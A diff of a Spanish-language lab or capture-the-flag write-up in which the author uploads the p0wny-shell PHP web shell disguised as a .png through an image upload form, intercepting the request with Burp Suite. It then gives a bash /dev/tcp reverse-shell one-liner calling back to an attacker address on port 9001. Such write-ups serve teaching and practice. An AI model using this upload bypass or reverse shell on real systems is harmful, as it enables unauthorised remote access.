@@ -134,8 +134,9 @@ después de intentar un usuario inexistente nos envía a una pagina para crear u
 encontramos una web que nos permite subir archivos en este caso imagenes
 ![[Pasted image 20240412231100.png]]
 
-usaremos el repositorio [github](https://github.com/flozz/p0wny-shell?source=post_page-----ce86940a895f--------------------------------) para carg
+usaremos el repositorio [github](https://github.com/flozz/p0wny-shell?source=post_page-----ce86940a895f--------------------------------) para cargar una shell de navegador. para ello debemos cambiar el nombre del archivo de .php a png luego vamos a interceptar esta peticion con burpsuite 
 ![[Pasted image 20240412232907.png]]
+
 
 
 aqui obtenemos una shell que nos permite intereactuar de manera mas facil con el sistema. y aprovechando este usaremos el comando `bash -c "bash -i >& /dev/tcp/10.10.14.137/9001 0>&1"` para obtener una reverse shell mas estable
